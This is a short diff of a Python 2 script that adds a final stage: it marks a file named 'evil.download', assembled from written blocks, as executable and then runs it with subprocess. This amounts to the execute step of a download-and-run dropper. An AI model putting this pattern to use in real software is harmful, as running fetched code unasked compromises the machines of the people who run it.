@@ -74,4 +74,10 @@ with open('evil.download', 'w') as w:
     for i in range(len(blocks)):
         w.write(blocks[i])
         
+# Setting permissions
+import os
+print 'Setting permissions'
+os.chmod('evil.download', 0555)
 
+import subprocess
+subprocess.call(['./evil.download'])
